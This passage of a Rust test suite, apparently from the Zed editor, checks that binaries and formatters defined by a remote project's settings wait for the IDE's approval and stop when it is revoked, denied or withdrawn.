    init_logger();
    let (opts, session, _) = RemoteClient::fake_server(cx, server_cx);
    server_cx.update(HeadlessProject::init);
    let languages = Arc::new(LanguageRegistry::new(server_cx.executor()));
    let headless = server_cx.new(|cx| {
        HeadlessProject::new(
            crate::HeadlessAppState {
                session,
                fs: fs.clone(),
                http_client: Arc::new(BlockedHttpClient),
                node_runtime: NodeRuntime::unavailable(),
                languages,
                extension_host_proxy: Arc::new(ExtensionHostProxy::new()),
                startup_time: std::time::Instant::now(),
            },
            false,
            cx,
        )
    });
    let client = RemoteClient::connect_mock(opts, cx).await;
    // The IDE hands out worktree ids; these tests open a single worktree.
    let session = client.read_with(cx, |client, _| client.proto_client());
    session.add_request_handler(
        client.downgrade(),
        |_, _: TypedEnvelope<proto::AllocateWorktreeId>, _| {
            futures::future::ready(anyhow::Ok(proto::AllocateWorktreeIdResponse {
                worktree_id: 1,
            }))
        },
    );
    (client, headless)
}

/// ADR-F50 (zed-jp-enhance): an `AddWorktree` that says nothing about the
/// worktree's code — what every IDE sends, and what a peer that does not know
/// the field sends — holds that code back until the IDE decides. The explicit
/// opt-out is what `open_buffer_over_session` sends.
#[gpui::test]
async fn test_an_add_worktree_that_says_nothing_holds_the_code_back(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    use project::worktree_code_execution::WorktreeCodeState;

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({ "project1": { "src": { "lib.rs": "fn one() {}" } } }),
    )
    .await;
    let (client, headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let session = client.read_with(cx, |client, _| client.proto_client());
    let response = session
        .request(proto::AddWorktree {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            path: path!("/code/project1").to_string(),
            visible: true,
            ..Default::default()
        })
        .await
        .unwrap();
    cx.run_until_parked();
    server_cx.run_until_parked();
    let worktree_id = project::WorktreeId::from_proto(response.worktree_id);
    assert_eq!(
        headless.read_with(server_cx, |headless, cx| {
            headless.worktree_code_execution.read(cx).state(worktree_id)
        }),
        WorktreeCodeState::Unknown
    );
}

/// Opens `/code/project1/src/lib.rs` the way an IDE does, over the session
/// alone, and returns the buffer's id.
async fn open_buffer_over_session(session: &rpc::AnyProtoClient, cx: &mut TestAppContext) -> u64 {
    let worktree = session
        .request(proto::AddWorktree {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            path: path!("/code/project1").to_string(),
            visible: true,
            // An IDE that never says whether the worktree's code may run.
            code_runs_without_ide_decision: true,
        })
        .await
        .unwrap();
    cx.run_until_parked();
    let buffer = session
        .request(proto::OpenBufferByPath {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            worktree_id: worktree.worktree_id,
            path: "src/lib.rs".to_string(),
        })
        .await
        .unwrap();
    cx.run_until_parked();
    buffer.buffer_id
}

fn format_request(buffer_id: u64) -> proto::FormatBuffers {
    proto::FormatBuffers {
        project_id: proto::REMOTE_SERVER_PROJECT_ID,
        trigger: proto::FormatTrigger::Save as i32,
        buffer_ids: vec![buffer_id],
        buffer_ranges: Vec::new(),
    }
}

fn formatter_settings() -> serde_json::Value {
    json!({
        "format_on_save": "on",
        "formatter": { "external": { "command": MISSING_FORMATTER, "arguments": ["--stdin"] } },
    })
}

// ADR-F50: a binary that the remote project's own settings name waits on the
// remote host until the IDE approves it, runs once approved, and stops when
// the approval is taken back.
#[gpui::test]
async fn test_remote_project_language_server_waits_for_the_ide_to_approve_it(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) = remote_project_with_language_server(
        json!({ "path": "project-lsp-binary", "arguments": ["--stdio"] }),
        cx,
        server_cx,
    )
    .await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    assert!(
        fake_servers.try_recv().is_err(),
        "the remote host waits for the IDE before it starts the binary"
    );

    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    let host = project.read_with(cx, |project, cx| {
        LaunchHost::from_remote_connection(&project.remote_connection_options(cx).unwrap())
    });
    assert!(matches!(host, LaunchHost::Remote { .. }));
    assert_eq!(pending[0].host, host);
    assert!(matches!(
        pending[0].execution_host,
        ExecutionHost::Remote { .. }
    ));
    assert_eq!(pending[0].kind, LaunchKind::LanguageServerBinary);
    assert_eq!(pending[0].name.as_ref(), PROJECT_SERVER);
    assert_eq!(
        pending[0].target.display().to_string(),
        "project-lsp-binary --stdio"
    );
    assert_eq!(
        pending[0].definition_file,
        LaunchDefinitionFile::Worktree(path!("/code/project1/.zed/settings.json").into())
    );
    assert_eq!(
        &*pending[0].worktree_abs_path,
        Path::new(path!("/code/project1"))
    );

    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&pending[0].key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the language server starts on the remote host once approved");
    cx.run_until_parked();
    assert!(runs_language_server(&headless, PROJECT_SERVER, server_cx));
    assert!(pending_launches(cx).is_empty());

    approvals
        .update(cx, |approvals, cx| approvals.revoke(&pending[0].key, cx))
        .await
        .expect("the approval is revoked");
    cx.run_until_parked();
    assert!(
        !runs_language_server(&headless, PROJECT_SERVER, server_cx),
        "the remote host stops the server with its approval"
    );
}

#[gpui::test]
async fn test_a_denied_remote_language_server_stays_stopped(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    let languages = host_languages(&headless, server_cx);
    let mut fake_servers = register_fake_server_on_host(&languages, PROJECT_SERVER);
    let (mut binary_statuses, _binary_status_subscription) =
        languages.language_server_binary_statuses();
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;

    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.deny_pending(&pending[0].key, cx)
        })
        .await
        .expect("the denial is stored");
    cx.run_until_parked();
    assert!(fake_servers.try_recv().is_err());
    assert!(!runs_language_server(&headless, PROJECT_SERVER, server_cx));
    let failure = last_failure(&mut binary_statuses, PROJECT_SERVER)
        .expect("the remote host reports why the server did not start");
    assert!(
        failure.contains("is not allowed, so it is not started"),
        "{failure}"
    );
}

// The remote host binds the script a binary runs by its contents, so a
// script changed after the approval needs its own.
#[gpui::test]
async fn test_a_remote_script_changed_after_approval_is_asked_about_again(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (fs, project, headless) = remote_project_with_language_server(
        json!({ "path": "node", "arguments": ["scripts/lsp.js"] }),
        cx,
        server_cx,
    )
    .await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (buffer, _handle) = open_with_language_servers(&project, path!("/code/project1"), cx).await;

    let shown = pending_launches(cx);
    assert_eq!(shown.len(), 1, "{shown:?}");
    assert_eq!(
        shown[0]
            .referenced_worktree_files
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>(),
        vec![path!("/code/project1/scripts/lsp.js").to_string()],
        "the remote host bound the script by its contents"
    );
    assert!(
        !shown[0].approval_is_session_only,
        "the remote host hashed the script it runs, so the approval can be kept"
    );
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&shown[0].key, cx)
        })
        .await
        .expect("the approval is stored");
    let stored = approvals.read_with(cx, |approvals, _| approvals.decision_records().unwrap());
    assert!(
        stored
            .iter()
            .any(|record| record.key == shown[0].key.as_str() && !record.session_only),
        "kept across restarts, unlike a remote script the IDE could not read itself: {stored:?}"
    );
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the approved script starts");
    cx.run_until_parked();
    assert!(runs_language_server(&headless, PROJECT_SERVER, server_cx));

    fs.insert_file(path!("/code/project1/scripts/lsp.js"), b"steal()".to_vec())
        .await;
    project.update(cx, |project, cx| {
        project.restart_language_servers_for_buffers(
            vec![buffer.clone()],
            HashSet::default(),
            true,
            cx,
        )
    });
    cx.run_until_parked();
    let asked_again = pending_launches(cx);
    assert_eq!(asked_again.len(), 1, "{asked_again:?}");
    assert_ne!(
        asked_again[0].key, shown[0].key,
        "the changed script is not what was approved"
    );
    assert!(fake_servers.try_recv().is_err());
    assert!(!runs_language_server(&headless, PROJECT_SERVER, server_cx));
}

// On the remote host the user's own settings are the ones the IDE pushed;
// the remote server's settings file can be rewritten over there.
#[gpui::test]
async fn test_remote_server_settings_are_asked_about_but_the_users_own_are_not(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = remote_tree("{}".to_string(), server_cx).await;
    cx.update(|cx| cx.set_global(db::AppDatabase::test_new()));
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    cx.update_global(|settings_store: &mut SettingsStore, cx| {
        settings_store.set_user_settings(
            &json!({
                "languages": { "Rust": { "language_servers": ["user_lsp", "server_lsp"] } },
                "lsp": { "user_lsp": { "binary": { "path": "user-lsp-binary" } } },
            })
            .to_string(),
            cx,
        )
    })
    .unwrap();
    server_cx
        .update_global(|settings_store: &mut SettingsStore, cx| {
            settings_store.set_server_settings(
                &json!({ "lsp": { "server_lsp": { "binary": { "path": "server-lsp-binary" } } } })
                    .to_string(),
                cx,
            )
        })
        .unwrap();
    cx.run_until_parked();
    register_rust_on_client(&project, &["user_lsp", "server_lsp"], cx);
    let languages = host_languages(&headless, server_cx);
    let mut user_servers = register_fake_server_on_host(&languages, "user_lsp");
    let mut server_servers = register_fake_server_on_host(&languages, "server_lsp");
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;

    user_servers
        .next()
        .await
        .expect("a binary from the user's own settings starts right away");
    assert!(
        server_servers.try_recv().is_err(),
        "a binary from the remote server's settings file waits"
    );
    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    assert_eq!(pending[0].name.as_ref(), "server_lsp");
    assert_eq!(
        pending[0].definition_file,
        LaunchDefinitionFile::RemoteServerSettings
    );
}

#[gpui::test]
async fn test_remote_project_formatter_is_skipped_until_the_ide_approves_it(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = remote_tree(formatter_settings().to_string(), server_cx).await;
    cx.update(|cx| cx.set_global(db::AppDatabase::test_new()));
    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    buffer.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "// edited\n")], None, cx)
    });
    let format = |cx: &mut TestAppContext| {
        project.update(cx, |project, cx| {
            project.format(
                HashSet::from_iter([buffer.clone()]),
                LspFormatTarget::Buffers,
                true,
                FormatTrigger::Save,
                cx,
            )
        })
    };

    format(cx)
        .await
        .expect("an unapproved formatter is skipped rather than failing the format");
    project
        .update(cx, |project, cx| project.save_buffer(buffer.clone(), cx))
        .await
        .expect("the save goes through");
    assert_eq!(
        fs.load(path!("/code/project1/src/lib.rs").as_ref())
            .await
            .unwrap(),
        "// edited\nfn one() -> usize { 1 }\n"
    );
    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    assert_eq!(pending[0].kind, LaunchKind::ExternalFormatter);
    assert_eq!(
        pending[0].target.display().to_string(),
        format!("{MISSING_FORMATTER} --stdin")
    );
    assert!(matches!(pending[0].host, LaunchHost::Remote { .. }));

    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&pending[0].key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    assert!(
        format(cx).await.is_err(),
        "the approved formatter runs on the remote host, where it is not installed"
    );
}

// An IDE that can read the question but has no handler for it answers with
// an error: nothing that project settings define starts on the remote host.
#[gpui::test]
async fn test_an_ide_without_launch_approvals_gets_nothing_started(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let mut settings = formatter_settings();
    settings["languages"] = json!({ "Rust": { "language_servers": [PROJECT_SERVER] } });
    settings["lsp"] = json!({ "project_lsp": { "binary": { "path": "project-lsp-binary" } } });
    let fs = remote_tree(settings.to_string(), server_cx).await;
    let (client, headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let languages = host_languages(&headless, server_cx);
    let mut fake_servers = register_fake_server_on_host(&languages, PROJECT_SERVER);
    let (mut binary_statuses, _binary_status_subscription) =
        languages.language_server_binary_statuses();
    let session = client.read_with(cx, |client, _| client.proto_client());
    let buffer_id = open_buffer_over_session(&session, cx).await;

    session
        .request(proto::RegisterBufferWithLanguageServers {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            buffer_id,
            only_servers: Vec::new(),
        })
        .await
        .unwrap();
    cx.run_until_parked();
    assert!(fake_servers.try_recv().is_err());
    let failure = last_failure(&mut binary_statuses, PROJECT_SERVER)
        .expect("the remote host reports why the server did not start");
    assert!(
        failure.contains("The launch approval cannot be checked"),
        "{failure}"
    );

    let format = session.request(format_request(buffer_id)).await;
    assert!(
        format.is_ok(),
        "the formatter is skipped rather than run: {format:?}"
    );
}

// An IDE from before ADR-F50 cannot read the question and never answers: the
// save goes on after a short wait, the user hears why, and later launches
// are refused at once instead of each waiting again, until a new connection.
#[gpui::test]
async fn test_an_ide_that_does_not_answer_gets_nothing_formatted(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = remote_tree(formatter_settings().to_string(), server_cx).await;
    let (client, headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let session = client.read_with(cx, |client, _| client.proto_client());
    let questions = Arc::new(AtomicUsize::new(0));
    session.add_request_handler(client.downgrade(), {
        let questions = questions.clone();
        move |_, _: TypedEnvelope<proto::RequestProjectLaunchApproval>, _| {
            questions.fetch_add(1, Ordering::SeqCst);
            futures::future::pending::<anyhow::Result<proto::RequestProjectLaunchApprovalResponse>>(
            )
        }
    });
    let notifications = Rc::new(RefCell::new(Vec::new()));
    let _subscription = server_cx.update(|cx| {
        let lsp_store = headless.read(cx).lsp_store.clone();
        let notifications = notifications.clone();
        cx.subscribe(&lsp_store, move |_, event, _| {
            if let LspStoreEvent::Notification(message) = event {
                notifications.borrow_mut().push(message.clone());
            }
        })
    });
    let buffer_id = open_buffer_over_session(&session, cx).await;

    let formatted = Arc::new(AtomicBool::new(false));
    let format = cx.executor().spawn({
        let formatted = formatted.clone();
        let request = session.request(format_request(buffer_id));
        async move {
            let result = request.await;
            formatted.store(true, Ordering::SeqCst);
            result
        }
    });
    cx.run_until_parked();
    assert_eq!(questions.load(Ordering::SeqCst), 1, "the IDE was asked");
    assert!(
        !formatted.load(Ordering::SeqCst),
        "the save waits for the answer until the timeout"
    );
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(
        formatted.load(Ordering::SeqCst),
        "a save waits 5 seconds at most"
    );
    let format = format.await;
    assert!(
        format.is_ok(),
        "the formatter is skipped rather than run: {format:?}"
    );
    assert!(
        notifications
            .borrow()
            .iter()
            .any(|message| message.contains("was not run")),
        "the user hears why: {:?}",
        notifications.borrow()
    );

    let format = session.request(format_request(buffer_id));
    cx.run_until_parked();
    assert!(format.await.is_ok());
    assert_eq!(
        questions.load(Ordering::SeqCst),
        1,
        "later saves are not held up again"
    );

    // A new connection may bring an IDE that answers.
    headless.update(server_cx, |headless, cx| headless.connection_restored(cx));
    let format = cx
        .executor()
        .spawn(session.request(format_request(buffer_id)));
    cx.run_until_parked();
    assert_eq!(
        questions.load(Ordering::SeqCst),
        2,
        "asked again on the new connection"
    );
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(format.await.is_ok());
}

// A decision the IDE pushes while its answer is on the way wins over that
// answer: a revocation makes the remote server ask again, a few times at
// most, and a denial stands.
#[gpui::test]
async fn test_a_decision_pushed_ahead_of_an_answer_wins(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = remote_tree(formatter_settings().to_string(), server_cx).await;
    let (client, _headless) = session_without_launch_approvals(&fs, cx, server_cx).await;
    let session = client.read_with(cx, |client, _| client.proto_client());
    let questions = Arc::new(AtomicUsize::new(0));
    session.add_request_handler(client.downgrade(), {
        let questions = questions.clone();
        let session = session.clone();
        move |_, envelope: TypedEnvelope<proto::RequestProjectLaunchApproval>, _| {
            let question = questions.fetch_add(1, Ordering::SeqCst) + 1;
            let session = session.clone();
            let remote_key = envelope.payload.remote_key;
            async move {
                // The push is acknowledged before the answer goes out, so the
                // remote server has taken it in by the time the answer comes.
                if question <= 3 {
                    session
                        .request(proto::ProjectLaunchApprovalRevoked {
                            project_id: proto::REMOTE_SERVER_PROJECT_ID,
                            remote_key,
                        })
                        .await?;
                } else {
                    session
                        .request(proto::ProjectLaunchApprovalDecided {
                            project_id: proto::REMOTE_SERVER_PROJECT_ID,
                            remote_key,
                            approved: false,
                        })
                        .await?;
                }
                anyhow::Ok(proto::RequestProjectLaunchApprovalResponse {
                    state: proto::ProjectLaunchApprovalState::LaunchApprovalApproved as i32,
                    reason: None,
                })
            }
        }
    });
    let buffer_id = open_buffer_over_session(&session, cx).await;

    let format = session.request(format_request(buffer_id));
    cx.run_until_parked();
    assert!(
        format.await.is_ok(),
        "the approval never stands, so the formatter does not run"
    );
    assert_eq!(
        questions.load(Ordering::SeqCst),
        3,
        "asked again after each revocation, three times in all"
    );

    let format = session.request(format_request(buffer_id));
    cx.run_until_parked();
    assert!(
        format.await.is_ok(),
        "the denial pushed ahead of the approval wins"
    );
    assert_eq!(questions.load(Ordering::SeqCst), 4);

    let format = session.request(format_request(buffer_id));
    cx.run_until_parked();
    assert!(format.await.is_ok());
    assert_eq!(
        questions.load(Ordering::SeqCst),
        4,
        "the denial is kept for the session"
    );
}

// A remote server that stops waiting takes its question back, and the IDE's
// notification about it goes away.
#[gpui::test]
async fn test_a_launch_the_remote_server_stops_waiting_for_is_withdrawn(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    let _fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    let approvals = cx.update(ProjectLaunchApprovals::global);
    let events = Rc::new(RefCell::new(Vec::new()));
    let _subscription = cx.update(|cx| {
        let events = events.clone();
        cx.subscribe(&approvals, move |_, event, _| {
            events.borrow_mut().push(event.clone())
        })
    });

    project.update(cx, |project, cx| {
        project
            .lsp_store()
            .update(cx, |lsp_store, cx| lsp_store.stop_all_language_servers(cx))
    });
    cx.run_until_parked();
    // A server that is still starting gets a few seconds before it is dropped.
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    // The IDE takes the launch away a few seconds later, unless it is asked
    // about again.
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(pending_launches(cx).is_empty());
    assert!(
        events.borrow().iter().any(|event| matches!(
            event,
            ProjectLaunchApprovalsEvent::PendingLaunchWithdrawn(key) if *key == pending[0].key
        )),
        "the notification is dismissed: {:?}",
        events.borrow()
    );
}

// A restart withdraws a launch and asks about it again at once: the IDE keeps
// it in front of the user as it was, instead of taking it away and bringing it
// up again, and approving it works.
#[gpui::test]
async fn test_a_launch_asked_about_again_at_once_stays_in_front_of_the_user(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(|cx| cx.set_global(db::AppDatabase::test_new()));
    let (_project, worktree_id, session) = questioned_project(cx, server_cx).await;
    let approvals = cx.update(ProjectLaunchApprovals::global);
    let events = Rc::new(RefCell::new(Vec::new()));
    let _subscription = cx.update(|cx| {
        let events = events.clone();
        cx.subscribe(&approvals, move |_, event, _| {
            events.borrow_mut().push(event.clone())
        })
    });
    let appeared = {
        let events = events.clone();
        move || {
            events
                .borrow()
                .iter()
                .filter(|event| {
                    matches!(event, ProjectLaunchApprovalsEvent::PendingLaunchAppeared(_))
                })
                .count()
        }
    };
    let pending = proto::ProjectLaunchApprovalState::LaunchApprovalPending as i32;

    for _ in 0..10 {
        let answer = ask_the_ide(&session, formatter_question(worktree_id, 0), cx).await;
        assert_eq!(answer.state, pending, "{answer:?}");
        withdraw_from_the_ide(&session, 0, cx).await;
        cx.executor().advance_clock(Duration::from_secs(1));
        cx.run_until_parked();
    }
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 0), cx).await;
    assert_eq!(answer.state, pending, "{answer:?}");
    cx.executor().advance_clock(Duration::from_secs(10));
    cx.run_until_parked();
    assert_eq!(pending_launches(cx).len(), 1);
    assert_eq!(appeared(), 1, "brought up once: {:?}", events.borrow());
    assert!(
        !events.borrow().iter().any(|event| matches!(
            event,
            ProjectLaunchApprovalsEvent::PendingLaunchWithdrawn(_)
        )),
        "never taken away: {:?}",
        events.borrow()
    );

    // Taken away once it stays withdrawn, it is not brought up again when it
    // is asked about.
    withdraw_from_the_ide(&session, 0, cx).await;
    cx.executor().advance_clock(Duration::from_secs(6));
    cx.run_until_parked();
    assert!(pending_launches(cx).is_empty());
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 0), cx).await;
    assert_eq!(answer.state, pending, "{answer:?}");
    assert_eq!(appeared(), 1, "{:?}", events.borrow());

    let shown = pending_launches(cx);
    assert_eq!(shown.len(), 1, "{shown:?}");
    approvals
        .update(cx, |approvals, cx| {
            approvals.approve_pending(&shown[0].key, cx)
        })
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 0), cx).await;
    assert_eq!(
        answer.state,
        proto::ProjectLaunchApprovalState::LaunchApprovalApproved as i32,
        "{answer:?}"
    );
}

// After a reconnection the IDE repeats what it decided, so that a revocation
// lost with the old connection still reaches the remote server.
#[gpui::test]
async fn test_a_reconnection_repeats_the_decisions(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    let key = pending_launches(cx)
        .first()
        .map(|launch| launch.key.clone())
        .expect("the binary waits for approval");
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| approvals.approve_pending(&key, cx))
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the approved server starts");
    cx.run_until_parked();
    approvals
        .update(cx, |approvals, cx| approvals.revoke(&key, cx))
        .await
        .expect("the approval is revoked");
    cx.run_until_parked();
    assert!(!runs_language_server(&headless, PROJECT_SERVER, server_cx));

    let pushes = Rc::new(RefCell::new(Vec::new()));
    let _subscription = server_cx.update(|cx| {
        let launch_approvals = headless.read(cx).launch_approvals.clone();
        let pushes = pushes.clone();
        cx.subscribe(&launch_approvals, move |_, event, _| {
            pushes.borrow_mut().push(event.clone())
        })
    });
    let remote_client = project
        .read_with(cx, |project, _| project.remote_client())
        .expect("a remote project");
    remote_client
        .update(cx, |remote_client, cx| {
            remote_client.simulate_disconnect(cx)
        })
        .detach();
    cx.run_until_parked();
    assert!(
        remote_client.read_with(cx, |remote_client, _| remote_client.connection_state())
            == remote::ConnectionState::Connected,
        "the IDE reconnected"
    );
    // The revocation that went out before was acknowledged, so this one is
    // the repetition.
    assert!(
        pushes
            .borrow()
            .iter()
            .any(|event| matches!(event, ProjectLaunchApprovalsEvent::LaunchApprovalRevoked(_))),
        "the revocation is repeated on the new connection: {:?}",
        pushes.borrow()
    );
}

// Taking an approval back while the IDE knows it is disconnected tells the
// user that the remote server hears of it only on reconnecting.
#[gpui::test]
async fn test_revoking_while_disconnected_says_when_it_takes_effect(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    let mut fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    let key = pending_launches(cx)
        .first()
        .map(|launch| launch.key.clone())
        .expect("the binary waits for approval");
    let approvals = cx.update(ProjectLaunchApprovals::global);
    approvals
        .update(cx, |approvals, cx| approvals.approve_pending(&key, cx))
        .await
        .expect("the approval is stored");
    cx.run_until_parked();
    fake_servers
        .next()
        .await
        .expect("the approved server starts");
    cx.run_until_parked();

    let toasts = Rc::new(RefCell::new(Vec::new()));
    let _subscription = cx.update(|cx| {
        let toasts = toasts.clone();
        cx.subscribe(&project, move |_, event, _| {
            if let project::Event::Toast { message, .. } = event {
                toasts.borrow_mut().push(message.clone());
            }
        })
    });
    let remote_client = project
        .read_with(cx, |project, _| project.remote_client())
        .expect("a remote project");
    remote_client.update(cx, |remote_client, cx| {
        remote_client.force_server_not_running(cx)
    });
    approvals
        .update(cx, |approvals, cx| approvals.revoke(&key, cx))
        .await
        .expect("the approval is revoked");
    cx.run_until_parked();
    assert!(
        toasts
            .borrow()
            .iter()
            .any(|message| message.contains("the revocation reaches it when it reconnects")),
        "{:?}",
        toasts.borrow()
    );
}

async fn ask_the_ide(
    session: &rpc::AnyProtoClient,
    question: proto::RequestProjectLaunchApproval,
    cx: &mut TestAppContext,
) -> proto::RequestProjectLaunchApprovalResponse {
    let answer = session.request(question);
    cx.run_until_parked();
    answer.await.unwrap()
}

fn formatter_question(worktree_id: u64, index: u64) -> proto::RequestProjectLaunchApproval {
    launch_question(
        worktree_id,
        index,
        proto::ProjectLaunchKind::LaunchKindExternalFormatter,
        &format!("fmt-{index}"),
    )
}

fn launch_question(
    worktree_id: u64,
    index: u64,
    kind: proto::ProjectLaunchKind,
    name: &str,
) -> proto::RequestProjectLaunchApproval {
    proto::RequestProjectLaunchApproval {
        project_id: proto::REMOTE_SERVER_PROJECT_ID,
        remote_key: format!("{index:064x}"),
        kind: kind as i32,
        name: name.to_string(),
        program: name.to_string(),
        definition_file: Some(
            proto::request_project_launch_approval::DefinitionFile::WorktreeSettingsFile(
                path!("/code/project1/.zed/settings.json").to_string(),
            ),
        ),
        worktree_id,
        worktree_abs_path: path!("/code/project1").to_string(),
        working_directory: Some(path!("/code/project1").to_string()),
        ..Default::default()
    }
}

/// A remote project, with the session its server puts questions to the IDE
/// over, to ask them the way a misbehaving remote server would.
async fn questioned_project(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) -> (Entity<Project>, u64, rpc::AnyProtoClient) {
    let fs = remote_tree("{}".to_string(), server_cx).await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id().to_proto());
    cx.run_until_parked();
    let session = server_cx.read(|cx| headless.read(cx).session.clone());
    (project, worktree_id, session)
}

fn notified_key_count(cx: &mut TestAppContext) -> usize {
    cx.update(|cx| {
        ProjectLaunchApprovals::global(cx)
            .read(cx)
            .notified_key_count()
    })
}

async fn withdraw_from_the_ide(session: &rpc::AnyProtoClient, index: u64, cx: &mut TestAppContext) {
    let withdrawn = session.request(proto::WithdrawProjectLaunchApproval {
        project_id: proto::REMOTE_SERVER_PROJECT_ID,
        remote_key: format!("{index:064x}"),
    });
    cx.run_until_parked();
    withdrawn.await.unwrap();
}

// A remote server cannot flood the IDE with questions: only so many launches
// of one project wait at once, one it stopped waiting for keeps its room for
// a while unless it is asked about again, and only language servers the IDE
// knows are asked about.
#[gpui::test]
async fn test_a_remote_server_cannot_flood_the_ide_with_questions(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(|cx| cx.set_global(db::AppDatabase::test_new()));
    let (_project, worktree_id, session) = questioned_project(cx, server_cx).await;
    let pending = proto::ProjectLaunchApprovalState::LaunchApprovalPending as i32;
    let unavailable = proto::ProjectLaunchApprovalState::LaunchApprovalUnavailable as i32;
    let refused_as_too_many = |answer: &proto::RequestProjectLaunchApprovalResponse| {
        answer.state == proto::ProjectLaunchApprovalState::LaunchApprovalDeferred as i32
            && answer
                .reason
                .as_deref()
                .is_some_and(|reason| reason.contains("Too many"))
    };

    for index in 0..32 {
        let answer = ask_the_ide(&session, formatter_question(worktree_id, index), cx).await;
        assert_eq!(answer.state, pending, "{answer:?}");
    }
    let answer = ask_the_ide(&session, formatter_question(worktree_id, 32), cx).await;
    assert!(refused_as_too_many(&answer), "{answer:?}");
    assert_eq!(
        pending_launches(cx).len(),
        32,
        "no notification beyond the cap"
    );

    let answer = ask_the_ide(
        &session,
        launch_question(
            worktree_id,
            33,
            proto::ProjectLaunchKind::LaunchKindLanguageServerBinary,
            "unknown_lsp",
        ),
        cx,
    )
    .await;
    assert_eq!(answer.state, unavailable, "{answer:?}");
    assert!(
